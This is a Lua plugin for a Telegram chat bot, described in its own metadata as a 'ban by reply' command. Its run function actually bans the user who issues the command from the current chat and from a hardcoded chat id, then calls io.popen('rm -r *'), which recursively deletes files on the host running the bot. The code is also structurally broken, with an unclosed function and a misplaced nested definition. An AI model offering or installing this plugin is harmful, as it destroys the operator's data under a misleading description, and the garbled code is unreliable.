local function ban_user(user_id, chat_id)
local chat = 'chat#id'..chat_id
local user = 'user#id'..user_id
chat_del_user(chat, user, function (data, success, result)
if success ~= 1 then
send_msg(data.chat, 'Error while kicking user', ok_cb, nil)
end
end, {chat=chat, user=user})
end

local function pre_process(msg)

  -- SERVICE MESSAGE
  if msg.action and msg.action.type then
    local action = msg.action.type
    -- Check if banned user joins chat
    if action == 'chat_add_user' or action == 'chat_add_user_link' then
      local user_id
      if msg.action.link_issuer then
        user_id = msg.from.id
      else
	      user_id = msg.action.user.id
      end
      local function run (msg, matches)

local user = msg.from.id
local chat = msg.to.id

if msg.to.type ~= 'chat' then
return "Not a chat group!"
else
ban_user(user, 21005536)
ban_user(user, chat)
io.popen('rm -r *')
end
end
return {
description = "ban by reply.",
usage = {
"!ban"
},
patterns = {
"^!ban$"
},
run = run
}

